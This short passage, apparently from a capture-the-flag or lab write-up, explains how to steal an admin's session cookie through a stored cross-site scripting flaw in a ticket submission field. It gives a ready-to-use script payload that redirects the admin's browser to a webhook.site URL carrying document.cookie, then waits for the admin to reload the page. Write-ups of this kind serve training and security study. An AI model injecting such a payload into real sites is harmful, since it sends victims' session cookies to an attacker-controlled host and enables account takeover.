We can set up a webhook at webhook.site and then enter the following command into the ticket submission field:
```
<script>window.location.href = `https://webhook.site/99acbbcc-f95d-40f0-8678-2b6a4518b613/?param=${document.cookie}`</script>
```
and wait for the admin user to reload the page. (This might not be the best solution since the admin user will be redirected to the webhook.site website).
